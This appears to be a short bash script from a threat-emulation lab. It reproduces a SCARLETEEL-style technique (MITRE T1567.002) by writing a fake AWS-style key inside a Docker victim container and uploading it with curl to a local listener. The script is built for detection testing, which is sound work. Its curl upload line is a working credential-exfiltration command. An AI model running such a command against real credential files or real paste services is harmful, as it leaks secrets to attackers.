#!/usr/bin/env bash
# TJ-3 — T1567.002: credential upload to a legitimate paste-service stand-in.
# Corpus: SCARLETEEL 2.0 (Sysdig TRT, Sep 2023) — variants uploading to temp.sh / termbin.
# Safe: fake credential file; endpoint is the LOCAL listener (never a real third party).
set -euo pipefail
cd "$(dirname "$0")"
./setup-listener.sh >/dev/null
LISTENER_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' tj-listener)

echo "=== TJ-3 begin $(date -u +%FT%TZ)"
docker exec tj-victim bash -c \
  "echo 'AKIAFAKECREDENTIAL0000' > /tmp/creds.txt && curl -s --upload-file /tmp/creds.txt http://$LISTENER_IP:80/upload"
echo "=== TJ-3 end   $(date -u +%FT%TZ)"
